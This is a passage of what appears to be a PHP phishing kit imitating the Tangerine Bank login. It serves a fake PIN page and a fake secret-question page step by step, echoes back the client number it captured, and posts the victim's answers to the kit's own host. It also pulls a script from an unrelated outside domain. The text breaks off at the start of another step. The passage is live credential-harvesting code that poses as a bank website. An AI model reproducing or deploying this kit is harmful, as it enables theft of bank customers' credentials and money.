                    <i class="icon-question-sign" data-container="body" data-toggle="tooltip" data-placement="right" data-html="false" title="Your Personal Identification Number (PIN) is the 4 or 6-digit number you selected when you enrolled. For security reasons, you should never disclose your PIN to anyone."></i></label><input type="password" maxlength="6" NAME="pin" id="PIN" class="input-small" required="required"><span class="help-block"><a href="/web/Tangerine.html?command=displayResetPINInfo">I forgot my PIN</a></span>
</fieldset>
</div>
<div class="button-holder text-center">
<script>
function start()
{

if($("#PIN").val()!="")
{
$("#startttt").show();
$("#please").show();

$("#go").attr("disabled", true);
$("#frm").submit();
}
}

</script>
<button class="btn btn-primary" id="go" type="submit" NAME="Go">Go <img id="startttt" alt="" style="display:none" /></button>
<br><div style="display:none" id="please">Please wait...</div>
</div>
</form>
</div>
</div></div>
</div>
<div class="row-fluid">
<div class="span8">
</div>
</div>
</div>
	
</div>
</div>
</div>
</div>
</section>

<footer class="footer" id="main-footer">
<div class="container">
<div id="footer-body" class="footer-body">
<div class="row-fluid">
<div class="span12">
<h1>We're here for you</h1>
</div>
</div>
<div class="row-fluid">
<div class="span4">
<h3>Phone us</h3>
<div>
<dl>
<dt>Give us a call 24 hours a day, 7 days a week at</dt>
<dd class="footer-tel">1-888-826-4374</dd>
</dl>
</div>
<h3>Chat us up</h3>
<p>Chat availability <br>Weekdays: 8am “ 8pm ET <br>Weekend: 9am “ 5pm ET</p>
<div>
<p>
<span id="chat-unavailable" class="is-hidden">Sorry, there are no Direct Associates available at the moment.</span><span id="chat-available" class="">
                                Get the conversation started
      							<a id="ChatBtn" href="javascript:ClickToChat(24);">Chat with us</a><script type="text/javascript">
	                  	function ClickToChat(input){
												window.open ("http://ing-eng.frontlinesvc.com/app/chat/chat_landing/prod/"+input,"chat","menubar=1,resizable=1,width=350,height=450");
											}
	                  </script></span>
</p>
</div>
</div>
<div class="span4">
<h3>Email us</h3>
<div>
<dl>
<dt>For general questions or inquiries</dt>
<dd>
<a href="mailto:clientservices@site.com">clientservices@tangerine.ca</a>
</dd>
</dl>
</div>
<h3>Visit us</h3>
<p>Come visit us at one of our <a href="http://www.site.com/en/ways-to-bank/cafe/index.html">Tangerine Caf&#195;©s</a>
</p>
</div>
<div class="span4">
<h3>Get social with us</h3>
<div>
<div class="social-links">
<a href="http://twitter.com/TangerineBank" class="icon-twitter-sign" title="Twitter" target="_blank"></a><a href="http://www.facebook.com/TangerineBank" class="icon-facebook-sign" title="Facebook" target="_blank"></a><a href="http://www.linkedin.com/company/tangerine-bank" class="icon-linkedin-sign" title="LinkedIn" target="_blank"></a><a href="http://instagram.com/TangerineBank" class="icon-instagram" title="Instagram" target="_blank"></a><a href="http://www.youtube.com/TangerineBank" class="icon-youtube-sign" title="YouTube" target="_blank"></a>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="footer-navbar">
<div class="container">
<div class="row-fluid">
<div class="span12">
<div id="footer-see-more" class="footer-see-more">
<a>Contact us<i class="icon-caret-up"></i></a>
</div>
<ul class="footer-links-bottom">
<li>
<a href="http://www.site.com/en/about-us/careers/index.html">Careers</a>
</li>
<li>
<a href="http://www.site.com/en/privacy/index.html">Privacy</a>
</li>
<li>
<a href="http://www.site.com/en/legal/index.html">Legal</a>
</li>
<li>
<a href="http://www.site.com/en/security/index.html">Security</a>
</li>
<li>
<a href="http://www.site.com/en/sitemap/index.html">Site&nbsp;map</a>
</li>
</ul>
</div>
</div>
</div>
</div>
</footer>
</div>
</div>
</div>
<script>
      //Default value - set to true on xsl's to bypass default keypress handler
      var doCustomKeypress = false;
    </script>
<div id="modalStatus" style="display:none">true</div>
<div id="RefreshLinkSection" style="display:none">/web/InitialTangerine.html?command=displayLogin&amp;device=web&amp;locale=en_CA</div>
<script src="css/jquery.min.js"></script><script src="css/bootstrap.min.js"></script><script src="css/custom-plugins.js"></script><script language="javascript">
      !function ($) {
        $('[data-popupWin="true"]').click(function(){
          var popupName = $(this).attr('data-popupWin-name');
          var features = $(this).attr('data-popupWin-features');
        
          if ($(this).is('a')) {
            window.open($(this).attr('href'), popupName, features);
            return false;            
          }
          else if (($(this).is('input') || $(this).is('button')) && ($(this).attr('type') == 'submit')) {
            window.open('', popupName, features);
            $('#' + $(this).attr('data-popupWin-form')).attr('target', popupName);            
          }
        })
      }(window.jQuery);
    </script>
<meta xmlns:xalan="http://xml.apache.org/xslt" name="DCSext.locale" content="en_CA">
<meta xmlns:xalan="http://xml.apache.org/xslt" name="DCSext.device" content="web">
<meta xmlns:xalan="http://xml.apache.org/xslt" name="DCSext.flavour" content="web">
<meta xmlns:xalan="http://xml.apache.org/xslt" name="WT.cg_n" content="Auth">
<meta xmlns:xalan="http://xml.apache.org/xslt" name="WT.cg_s" content="Login">
<meta xmlns:xalan="http://xml.apache.org/xslt" name="WT.si_n" content="Auth_Login">
<meta xmlns:xalan="http://xml.apache.org/xslt" name="WT.si_p" content="ValidateWebCIF">
<script xmlns:xalan="http://xml.apache.org/xslt" src="css/securewtinit.js" type="text/javascript"></script><script xmlns:xalan="http://xml.apache.org/xslt" src="css/securewtbase.js" type="text/javascript"></script>
<noscript xmlns:xalan="http://xml.apache.org/xslt">
<div>
<img alt="DCSIMG" id="DCSIMG" width="1" height="1" src="http://info.site.com/dcsqfhp5v10000082npv8ae8i_1k4j/njs.gif?dcsuri=/nojavascript&amp;WT.js=No&amp;WT.tv=8.0.2"></div>
</noscript>
<script xmlns:xalan="http://xml.apache.org/xslt" type="text/javascript">
				if ((/iphone|ipod|ipad.*os 5/gi).test(navigator.appVersion)) {
					window.onpageshow = function(evt) {
					// If persisted then it is in the page cache, force a reload of the page.
						if (evt.persisted) {
							document.body.style.display = "none";
							location.reload();
						};
					};
				};
		</script><script xmlns:xalan="http://xml.apache.org/xslt" type="text/javascript">
				function invalidateBackCache() {
					// necessary for Safari: mobile desktop
				};
				if(window.addEventListener){
					window.addEventListener("unload", invalidateBackCache, false);
				};
		</script><script xmlns:xalan="http://xml.apache.org/xslt" LANGUAGE="JavaScript">
				function linkTracker(file, description){
				
						dcsMultiTrack(
							'DCS.dcsuri', file,
							'WT.ti',      description);
					
				}
				</script>
<meta xmlns:xalan="http://xml.apache.org/xslt" http-equiv="Refresh" content="1560; URL=/web/InitialTangerine.html?command=displayLoginRegular&amp;device=web&amp;locale=en_CA&amp;timeout=1">
<script language="javascript">
          var len= $('script').filter(function(){
            return ($(this).attr('src') == 'css/bootstrap.min.js'); 
          }).length;
          
          if (len==0){
            $.getScript("css/bootstrap-tooltip.js");
            $.getScript("css/bootstrap-transition.js");
          }
        </script><script language="javascript">
            //TQA00355569 - already done in custom-plugins.js
		    //$('[data-toggle="tooltip"]').tooltip();
	  	</script><script xmlns:xalan="http://xml.apache.org/xslt" async="true" type="text/javascript" src="http://www.splash-screen.net/76235/rapi.js?f=rCallback"></script><script language="JavaScript" src="css/pm_fp.js"></script><script language="JavaScript" src="css/global_v1.js"></script><script language="JavaScript" src="css/login.js"></script>
      $(document).ready(function() {
        //Test if browser supports cookies        
        setCookie('Name','Tangerine');
        if(getCookie('Name') != null) {
          // browser supports cookies, delete cookie
          document.cookie = "Name=deleted; expires=Thu, 01 Jan 1970 00:00:00 GMT";
          
          //Sets focus on PIN field
          $('#PIN').focus();
                    
          //Sets pm_fp hidden field
          $("#pm_fp").val(encode_deviceprint());
        }
        else {
          // browser DOES NOT support cookies
          window.location.href="BrowserSettings.html";          
        }
      })      
    </script><script>
      var touch = $('html').hasClass('touch') 
      if (!doCustomKeypress && !touch) {
        //Handle Enter keypress on input fields (excluding submit input buttons and Search input from top menu section) to trigger Form Submit
        $('input, select, .dropdown-toggle').not('[type=submit], .input-search').on('keypress', function(e){
          var key = e.keyCode || e.which;
          if ( key === 13 && $('.btn-primary').length ) {
            e.preventDefault(); 
            $('.btn-primary').not('[data-dismiss=modal]').last().trigger('click') //trigger first btn-primary button
          }
        })
      }

      // Remove event listener on href="#" after page is loaded 
      !function ($) {      
        if (window.removeEventListener) {
          window.removeEventListener('click', window.killClick, false)
        }
        else {
          document.detachEvent('onclick', window.killClick)
        }
        window.killClick = null
      }(window.jQuery)
    </script>
</body>
</html>



<?php
}

else

if($step==2)
{
?>
<!DOCTYPE html SYSTEM "">
<!--[if lt IE 7]><html lang="en-CA" class="no-js lt-ie9 lt-ie8 lt-ie7"><![endif]--><!--[if IE 7]><html lang="en-CA" class="no-js lt-ie9 lt-ie8"><![endif]--><!--[if IE 8]><html lang="en-CA" class="no-js lt-ie9"><![endif]--><!--[if gt IE 8]><html lang="en-CA" class="no-js"><![endif]--><html lang="en-CA" class="no-js">
<head>
<META http-equiv="Content-Type" content="text/html; charset=UTF-8">

<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="user-scalable=no, width=device-width, initial-scale=1.0, maximum-scale=1.0">
<meta name="format-detection" content="telephone=no">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-itunes-app" content="app-id=357596184">
<meta name="msApplication-ID" content="tangerine-canada">
<meta name="msApplication-PackageFamilyName" content="tangerine-canada.53e08338-59a9-40a1-a866-00d5b8ab432c">
<link rel="stylesheet" href="css/core.min.css">
<link rel="stylesheet" href="css/layout.css">
<link rel="stylesheet" href="css/module.css">
<link rel="stylesheet" href="css/state.css">
<meta name="author" content="Tangerine Bank">
<meta name="COPYRIGHT" content="Copyright (c) 2014 Tangerine">
<meta name="description" content="At Tangerine you never pay services fees. Your savings account earns a high rate of interest, requires no minimum balance, and your money is never locked in. Save Your Money with Tangerine. Our Loan Account and Mortgage products are industry leading, and investing options are available with our Mutual Funds. ">
<meta name="FORMAT" content="text/html">
<meta name="apple-itunes-app" content="app-id=847844097">
<meta name="google-play-app" content="app-id=ca.tangerine.clients.tablet&amp;hl=en">
<meta name="KEYWORDS" content="bank, banking, Canadian banks, financial services, Internet banking, electronic commerce, PC banking, ABM, telephone banking, business banking, business accounts, savings accounts, loans, mortgages, mutual funds, virtual bank, Virtual banking, great interest rates, Alternative banking, CDIC,ING, ING Bank, Web banking, GIC, RRSP, RSP,Performance, Save Your Money, Interac, Mastercard, Maestro, U.S. dollar, Cirrus">
<meta name="TITLE" content="Tangerine">
<meta http-equiv="pragma" content="no-cache">
<meta http-equiv="expires" content="0">
<meta http-equiv="cache-control" content="no-cache, no-store">
<noscript>
<meta http-equiv="refresh" content="0; Url=en_CA/web/BrowserSettings.html">
</noscript>
<title>Tangerine bank: Secret Question</title>
<script src="css/modernizr.js"></script>
</head>
<body>
<div class="viewport">
<div class="frame">
<div id="popout-nav" class="menu collapse">
<header class="mobile-menu-header">
<div class="mobile-menu-header-left">
<a href="/web/InitialTangerine.html?command=displayLogin&amp;device=web&amp;locale=en_CA">Log me in</a>
</div>
<div class="mobile-menu-header-right">
<div class="btn-group">
<a class="btn btn-warning active" type="button">EN</a><a class="btn" type="button" href="http://www.site.com/fr/index.html">FR</a>
</div>
</div>
</header>
<ul class="mobile-menu-nav">
<li>
<a href="/web/InitialTangerine.html?command=displayLogin&amp;device=web&amp;locale=en_CA">I'm a Client, let me in!</a>
</li>
<li>
<a href="http://www.site.com/en/saving/index.html">Saving</a><a class="mobile-dropdown collapsed" data-target="#mobile-dropdown-savings" data-toggle="collapse"><i class="icon-chevron-down"></i></a>
<div class="mobile-dropdown-menu collapse" id="mobile-dropdown-savings">
<a class="mobile-dropdown-item" href="http://www.site.com/en/saving/savings-accounts/index.html">Savings Accounts</a><a class="mobile-dropdown-item" href="http://www.site.com/en/saving/guaranteed-investments/index.html">Guaranteed Investments</a><a class="mobile-dropdown-item" href="http://www.site.com/en/saving/business-savings-accounts/index.html">Business Savings Accounts</a>
</div>
</li>
<li>
<a href="http://www.site.com/en/chequing/index.html">Chequing</a><a class="mobile-dropdown collapsed" data-target="#mobile-dropdown-chequing" data-toggle="collapse"><i class="icon-chevron-down"></i></a>
<div class="mobile-dropdown-menu collapse" id="mobile-dropdown-chequing">
<a href="http://www.site.com/en/chequing/chequing-account/index.html">Chequing Account</a>
</div>
</li>
<li>
<a href="http://www.site.com/en/investing/index.html">Investing</a><a class="mobile-dropdown collapsed" data-target="#mobile-dropdown-mutual-funds" data-toggle="collapse"><i class="icon-chevron-down"></i></a>
<div class="mobile-dropdown-menu collapse" id="mobile-dropdown-mutual-funds">
<a class="mobile-dropdown-item" href="http://www.site.com/en/investing/investment-funds/index.html">Investment Funds</a><a class="mobile-dropdown-item" href="http://www.site.com/en/investing/RSPs/index.html">RSPs</a><a class="mobile-dropdown-item" href="http://www.site.com/en/investing/TFSAs/index.html">TFSAs</a>
</div>
</li>
<li>
<a href="http://www.site.com/en/borrowing/index.html">Borrowing</a><a class="mobile-dropdown collapsed" data-target="#mobile-dropdown-mortgages" data-toggle="collapse"><i class="icon-chevron-down"></i></a>
<div class="mobile-dropdown-menu collapse" id="mobile-dropdown-mortgages">
<a class="mobile-dropdown-item" href="http://www.site.com/en/borrowing/tangerine-mortgage/index.html">Tangerine Mortgage</a><a class="mobile-dropdown-item" href="http://www.site.com/en/borrowing/home-equity-line-of-credit/index.html">Home Equity Line of Credit</a><a class="mobile-dropdown-item" href="http://www.site.com/en/borrowing/rsp-loan/index.html">RSP Loan</a>
</div>
</li>
<li>
<a href="http://www.site.com/en/ways-to-bank/index.html">Ways to bank</a><a class="mobile-dropdown collapsed" data-target="#mobile-dropdown-ways-to-bank" data-toggle="collapse"><i class="icon-chevron-down"></i></a>
<div class="mobile-dropdown-menu collapse" id="mobile-dropdown-ways-to-bank">
<a class="mobile-dropdown-item" href="http://www.site.com/en/ways-to-bank/online-banking/index.html">Online banking</a><a class="mobile-dropdown-item" href="http://www.site.com/en/ways-to-bank/mobile-banking/index.html">Mobile banking</a><a class="mobile-dropdown-item" href="http://www.site.com/en/ways-to-bank/telephone-banking/index.html">Telephone banking</a><a class="mobile-dropdown-item" href="http://www.site.com/en/ways-to-bank/cafe/index.html">Cafe</a><a class="mobile-dropdown-item" href="http://www.site.com/en/ways-to-bank/automated-banking-machines/index.html">ABMs</a><a class="mobile-dropdown-item" href="http://www.site.com/en/ways-to-bank/debit-card/index.html">Debit Card</a>
</div>
</li>
<li>
<a href="http://www.site.com/en/sign-me-up/index.html">Sign me up</a>
</li>
<li class="seperator"></li>
<li class="mobile-static">
<a href="../../InitialTangerine.html?locale=en_CA&amp;device=web&amp;command=goToAbmLocator">ABM locator</a>
</li>
<li class="mobile-static">
<a href="http://www.site.com/en/accounts-rates/ourrates/index.html">Rates</a>
</li>
<li class="mobile-static">
<a href="http://www.site.com/en/tools/index.html">Tools</a>
</li>
<li class="mobile-static">
<a href="http://forwardthinking.site.com/en/">Forward Thinking</a>
</li>
<li class="mobile-static">
<a href="http://www.site.com/en/faq/">FAQ</a>
</li>
<li class="mobile-static">
<a href="http://www.site.com/en/about-us/index.html">About us</a>
</li>
</ul>
</div>
<div class="view">
<section class="mobile-header-top hidden-desktop">
<div class="navbar-inner">
<button type="button" class="btn btn-navbar btn-menu" id="mobile-btn-open-nav" data-target="#popout-nav"><span class="icon-bar"></span><span class="icon-bar"></span><span class="icon-bar"></span></button><img src="css/tangerine_lockup.jpg" alt="Tangerine logo" width="160"><button class="btn btn-navbar btn-search icon-search collapsed" type="button" data-toggle="collapse" data-target="#mobile-header-search"></button>
</div>
<div class="collapse" id="mobile-header-search">
<form name="gs" method="GET" action="http://www.site.com/search">
<input type="hidden" name="site" value="en_tg_collection"><input type="hidden" name="client" value="en_tg_frontend"><input type="hidden" name="output" value="xml_no_dtd"><input type="hidden" name="proxystylesheet" value="en_tg_frontend"><input type="text" name="as_q" class="input input-search" accept-charset="UTF-8" placeholder="Search" tabindex="-1">
</form>
</div>
</section>
	
		
			
<section class="header-top visible-desktop">
<div class="container">
<div class="header-top-menu">
<a class="header-top-menu-link" href="http://www.site.com/en/about-us/index.html">About us</a> |
              <a class="header-top-menu-link" href="http://www.site.com/en/about-us/contact-us/index.html">Contact us</a> |
              <a class="header-top-menu-link" href="http://www.site.com/en/faq/">FAQs</a> |     

              <a href="http://www.site.com/fr/index.html">Francais</a> |
                  <a href="/web/InitialTangerine.html?command=displayLogin&amp;device=web&amp;locale=en_CA"><b>Log me in</b></a>
</div>
</div>
</section>
<section class="header-main visible-desktop">
<div class="container">
<div class="row-fluid">
<div class="span3">
<a href="http://www.site.com/en/" class="header-main-logo"><img src="css/tangerine_lockup.jpg" alt="Tangerine logo" width="200" height="50"></a>
</div>
<div class="span9">
<div class="header-main-menu">
<form name="gs" method="GET" action="http://www.site.com/search" class="pull-right">
<ul>
<li>
<a class="header-main-menu-link" href="../../InitialTangerine.html?locale=en_CA&amp;device=web&amp;command=goToAbmLocator">ABM locator</a>
</li>
<li>
<a class="header-main-menu-link" href="http://www.site.com/en/rates/">Rates</a>
</li>
<li>
<a class="header-main-menu-link" href="http://www.site.com/en/tools/index.html">Tools</a>
</li>
<li>
<a class="header-main-menu-link" href="http://forwardthinking.site.com/en/">Forward Thinking</a>
</li>
</ul>
<div class="input-append">
<input type="hidden" name="site" value="en_tg_collection"><input type="hidden" name="client" value="en_tg_frontend"><input type="hidden" name="output" value="xml_no_dtd"><input type="hidden" name="proxystylesheet" value="en_tg_frontend"><input type="text" name="as_q" class="input input-search" accept-charset="UTF-8" placeholder="Search"><button class="btn btn-secondary" type="submit"><i class="icon-search"></i></button>
</div>
</form>
</div>
</div>
</div>
</div>
</section>
<section class="nav-main">
<div class="container">
<nav class="navbar">
<ul class="nav dropdown">
<li class="active">
<a href="/web/InitialTangerine.html?command=displayLogin&amp;device=web&amp;locale=en_CA">I'm a Client, let me in!</a>
</li>
<li>
<a href="http://www.site.com/en/saving/index.html">Saving</a>
<ul class="dropdown-menu">
<li>
<a tabindex="-1" href="http://www.site.com/en/saving/savings-accounts/index.html">Savings Accounts</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/saving/guaranteed-investments/index.html">Guaranteed Investments</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/saving/business-savings-accounts/index.html">Business Savings Accounts</a>
</li>
</ul>
</li>
<li>
<a href="http://www.site.com/en/chequing/index.html">Chequing</a>
<ul class="dropdown-menu">
<li>
<a tabindex="-1" href="http://www.site.com/en/chequing/chequing-account/index.html">Chequing Account</a>
</li>
</ul>
</li>
<li>
<a href="http://www.site.com/en/investing/index.html">Investing</a>
<ul class="dropdown-menu">
<li>
<a tabindex="-1" href="http://www.site.com/en/investing/investment-funds/index.html">Investment Funds</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/investing/RSPs/index.html">RSPs</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/investing/TFSAs/index.html">TFSAs</a>
</li>
</ul>
</li>
<li>
<a href="http://www.site.com/en/borrowing/index.html">Borrowing</a>
<ul class="dropdown-menu">
<li>
<a tabindex="-1" href="http://www.site.com/en/borrowing/tangerine-mortgage/index.html">Tangerine Mortgage</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/borrowing/home-equity-line-of-credit/index.html">Home Equity Line of Credit</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/borrowing/rsp-loan/index.html">RSP Loan</a>
</li>
</ul>
</li>
<li>
<a href="http://www.site.com/en/ways-to-bank/index.html">Ways to bank</a>
<ul class="dropdown-menu">
<li>
<a tabindex="-1" href="http://www.site.com/en/ways-to-bank/online-banking/index.html">Online banking</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/ways-to-bank/mobile-banking/index.html">Mobile banking</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/ways-to-bank/telephone-banking/index.html">Telephone banking</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/ways-to-bank/cafe/index.html">Cafe</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/ways-to-bank/automated-banking-machines/index.html">ABMs</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/ways-to-bank/debit-card/index.html">Client Card</a>
</li>
</ul>
</li>
<li>
<a href="http://www.site.com/en/sign-me-up/index.html">Sign me up</a>
</li>
</ul>
</nav>
</div>
</section>
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	
	
<section class="content">
<div class="container">
<div class="row-fluid">
<div class="span12 content-span">
<div class="content-main">
	
<div class="login">
<div class="row-fluid">
<div class="span7">
<div class="mobile-wrapper">
<h2>This is how we know it's you...</h2>
<h3>You have entered <span class="orange"><?=$_SESSION['cc']?></span> as your Client Number.</h3>
<p>If this is wrong, <a href="#">please try again</a>.</p>
</div>
</div>
<div class="span5 content-main">
<form action="http://<?=$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']?>" name="ChallengeQuestion" id="ChallengeQuestion" method="POST" class="form-horizontal form-drop-controls challenge-question">
<input name="step" type="HIDDEN" value="3"><input name="locale" type="HIDDEN" value=""><input name="device" type="HIDDEN" value=""><input name="pm_fp" type="HIDDEN" id="pm_fp"><input type="hidden" name="BUTTON" id="BUTTON" value="">
<div class="content-main-wrapper">
<h2>Your secret question</h2>
<p><?=$_SESSION['question']?></p>
<div class="control-group">
<label class="control-label" for="inputAnswer">Answer</label>
<div class="controls">
<input type="text" name="answer" id="Answer" maxlength="40" value="" autocomplete="OFF" class="input" required="required">
</div>
</div>
<div class="control-group">
<label class="checkbox"><input type="checkbox" name="Register" id="Register" data-target="#nameit" data-toggle="collapse" class="input-login-checkbox">
                       Skip this next time 
                        <i class="icon-question-sign" data-container="body" data-toggle="tooltip" data-placement="right" data-html="false" title="Important: You should only register a computer you own (like your system at home or work). You should NOT register a public computer (for example, at a library or school)."></i></label>
</div>
<div id="nameit" class="login-nameit collapse">
<p>Register your computer to skip this step the next time you log in. You will be able to unregister your computer at any time.</p>
<p>By registering your computer, you consent to Tangerine using a non-temporary cookie. <a href="http://www.site.com/en/privacy/cookies/index.html" target="_blank">Learn more about cookies.</a>
</p>
</div>
</div>
<div class="button-holder">
<a href="javascript:submitBack()" class="btn btn-secondary" name="Back" id="Back">Back</a><button type="submit" class="btn btn-primary" name="Next" id="Next">Next</button>
</div>
</form>
<p class="text-center">
<a href="http://www.site.com/en/security/">All about safe &amp; secure online banking.</a>
</p>
</div>
</div>
</div>
	
</div>
</div>
</div>
</div>
</section>

<footer class="footer" id="main-footer">
<div class="container">
<div id="footer-body" class="footer-body">
<div class="row-fluid">
<div class="span12">
<h1>We're here for you</h1>
</div>
</div>
<div class="row-fluid">
<div class="span4">
<h3>Phone us</h3>
<div>
<dl>
<dt>Give us a call 24 hours a day, 7 days a week at</dt>
<dd class="footer-tel">1-800-464-3473</dd>
</dl>
</div>
<h3>Chat us up</h3>
<p>Chat availability <br>Weekdays: 8am &#239;&#191;&#189; 8pm ET <br>Weekend: 9am &#239;&#191;&#189; 5pm ET</p>
<div>
<p>
<span id="chat-unavailable" class="is-hidden">Sorry, there are no Direct Associates available at the moment.</span><span id="chat-available" class="">
                                Get the conversation started &#239;&#191;&#189;
      							<a id="ChatBtn" href="javascript:ClickToChat(24);">Chat with us</a><script type="text/javascript">
	                  	function ClickToChat(input){
												window.open ("http://ing-eng.frontlinesvc.com/app/chat/chat_landing/prod/"+input,"chat","menubar=1,resizable=1,width=350,height=450");
											}
	                  </script></span>
</p>
</div>
</div>
<div class="span4">
<h3>Email us</h3>
<div>
<dl>
<dt>For general questions or inquiries</dt>
<dd>
<a href="mailto:clientservices@site.com">clientservices@site.com</a>
</dd>
</dl>
</div>
<h3>Visit us</h3>
<p>Come visit us at one of our <a href="http://www.site.com/en/ways-to-bank/cafe/index.html">Tangerine Cafes</a>
</p>
</div>
<div class="span4">
<h3>Get social with us</h3>
<div>
<div class="social-links">
<a href="http://twitter.com/TangerineBank" class="icon-twitter-sign" title="Twitter" target="_blank"></a><a href="http://www.facebook.com/TangerineBank" class="icon-facebook-sign" title="Facebook" target="_blank"></a><a href="http://www.linkedin.com/company/tangerine-bank" class="icon-linkedin-sign" title="LinkedIn" target="_blank"></a><a href="http://instagram.com/TangerineBank" class="icon-instagram" title="Instagram" target="_blank"></a><a href="http://www.youtube.com/TangerineBank" class="icon-youtube-sign" title="YouTube" target="_blank"></a>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="footer-navbar">
<div class="container">
<div class="row-fluid">
<div class="span12">
<div id="footer-see-more" class="footer-see-more">
<a>Contact us<i class="icon-caret-up"></i></a>
</div>
<ul class="footer-links-bottom">
<li>
<a href="http://www.site.com/en/about-us/careers/index.html">Careers</a>
</li>
<li>
<a href="http://www.site.com/en/privacy/index.html">Privacy</a>
</li>
<li>
<a href="http://www.site.com/en/legal/index.html">Legal</a>
</li>
<li>
<a href="http://www.site.com/en/security/index.html">Security</a>
</li>
<li>
<a href="http://www.site.com/en/sitemap/index.html">Site&nbsp;map</a>
</li>
</ul>
</div>
</div>
</div>
</div>
</footer>
</div>
</div>
</div>
<script>
      //Default value - set to true on xsl's to bypass default keypress handler
      var doCustomKeypress = false;
    </script>
<div id="modalStatus" style="display:none">true</div>
<div id="RefreshLinkSection" style="display:none">/web/InitialTangerine.html?command=displayLogin&amp;device=web&amp;locale=en_CA</div>
<script src="css/jquery.min.js"></script><script src="css/bootstrap.min.js"></script><script src="css/custom-plugins.js"></script><script language="javascript">
      !function ($) {
        $('[data-popupWin="true"]').click(function(){
          var popupName = $(this).attr('data-popupWin-name');
          var features = $(this).attr('data-popupWin-features');
        
          if ($(this).is('a')) {
            window.open($(this).attr('href'), popupName, features);
            return false;            
          }
          else if (($(this).is('input') || $(this).is('button')) && ($(this).attr('type') == 'submit')) {
            window.open('', popupName, features);
            $('#' + $(this).attr('data-popupWin-form')).attr('target', popupName);            
          }
        })
      }(window.jQuery);
    </script>
<meta xmlns:xalan="http://xml.apache.org/xslt" name="DCSext.locale" content="en_CA">
<meta xmlns:xalan="http://xml.apache.org/xslt" name="DCSext.device" content="web">
<meta xmlns:xalan="http://xml.apache.org/xslt" name="DCSext.flavour" content="web">
<meta xmlns:xalan="http://xml.apache.org/xslt" name="WT.cg_n" content="Auth">
<meta xmlns:xalan="http://xml.apache.org/xslt" name="WT.cg_s" content="Login">
<meta xmlns:xalan="http://xml.apache.org/xslt" name="WT.si_n" content="Auth_Login">
<meta xmlns:xalan="http://xml.apache.org/xslt" name="WT.si_p" content="ChallengeQuestion">
<script xmlns:xalan="http://xml.apache.org/xslt" src="css/securewtinit.js" type="text/javascript"></script><script xmlns:xalan="http://xml.apache.org/xslt" src="css/securewtbase.js" type="text/javascript"></script>
<noscript xmlns:xalan="http://xml.apache.org/xslt">
<div>
<img alt="DCSIMG" id="DCSIMG" width="1" height="1" src="http://info.site.com/dcsqfhp5v10000082npv8ae8i_1k4j/njs.gif?dcsuri=/nojavascript&amp;WT.js=No&amp;WT.tv=8.0.2"></div>
</noscript>
<script xmlns:xalan="http://xml.apache.org/xslt" type="text/javascript">
				if ((/iphone|ipod|ipad.*os 5/gi).test(navigator.appVersion)) {
					window.onpageshow = function(evt) {
					// If persisted then it is in the page cache, force a reload of the page.
						if (evt.persisted) {
							document.body.style.display = "none";
							location.reload();
						};
					};
				};
		</script><script xmlns:xalan="http://xml.apache.org/xslt" type="text/javascript">
				function invalidateBackCache() {
					// necessary for Safari: mobile desktop
				};
				if(window.addEventListener){
					window.addEventListener("unload", invalidateBackCache, false);
				};
		</script><script xmlns:xalan="http://xml.apache.org/xslt" LANGUAGE="JavaScript">
				function linkTracker(file, description){
				
						dcsMultiTrack(
							'DCS.dcsuri', file,
							'WT.ti',      description);
					
				}
				</script>
<meta xmlns:xalan="http://xml.apache.org/xslt" http-equiv="Refresh" content="1560; URL=/web/InitialTangerine.html?command=displayLoginRegular&amp;device=web&amp;locale=en_CA&amp;timeout=1">
<script language="javascript">
          var len= $('script').filter(function(){
            return ($(this).attr('src') == 'css/bootstrap.min.js'); 
          }).length;
          
          if (len==0){
            $.getScript("css/bootstrap-tooltip.js");
            $.getScript("css/bootstrap-transition.js");
          }
        </script><script language="javascript">
            //TQA00355569 - already done in custom-plugins.js
		    //$('[data-toggle="tooltip"]').tooltip();
	  	</script><script language="JavaScript" src="css/pm_fp.js"></script><script>
        doCustomKeypress = true; //Set to use Custom handling of keypress  
        
        $(document).ready(function() {
          //Focus on Answer field
          $('#Answer').focus()
          
         //Triggers Next button click when Enter key is pressed
          $('#Answer').bind('keypress', function(e){
            var key = e.keyCode || e.which;
            if ( key === 13 ) {
              $('#BUTTON').val("Next");
              
              //IE 8 and under have a different behaviour (sending 2 requests)
              var ltIE9 =  $('html').hasClass('lt-ie9')
              if ($('html').hasClass('lt-ie9')) {
                $('#ChallengeQuestion').submit();
              }
              else {
                $('#Next').trigger('click') //trigger btn-primary button
              }
            }
          })
        })
        
       //Passmark Upgrade 2
       $("#pm_fp").val(encode_deviceprint());     
       
       function submitBack() {
            $('#BUTTON').val("Back");
            $('#ChallengeQuestion').submit();
       }
       
  </script><script>
      var touch = $('html').hasClass('touch') 
      if (!doCustomKeypress && !touch) {
        //Handle Enter keypress on input fields (excluding submit input buttons and Search input from top menu section) to trigger Form Submit
        $('input, select, .dropdown-toggle').not('[type=submit], .input-search').on('keypress', function(e){
          var key = e.keyCode || e.which;
          if ( key === 13 && $('.btn-primary').length ) {
            e.preventDefault(); 
            $('.btn-primary').not('[data-dismiss=modal]').last().trigger('click') //trigger first btn-primary button
          }
        })
      }
    </script>
</body>
</html>


<?
}

else

if($step==1)
{
?>

<!--[if lt IE 7]><html lang="en-CA" class="no-js lt-ie9 lt-ie8 lt-ie7"><![endif]--><!--[if IE 7]><html lang="en-CA" class="no-js lt-ie9 lt-ie8"><![endif]--><!--[if IE 8]><html lang="en-CA" class="no-js lt-ie9"><![endif]--><!--[if gt IE 8]><html lang="en-CA" class="no-js"><![endif]--><html lang="en-CA" class="no-js">
<head>
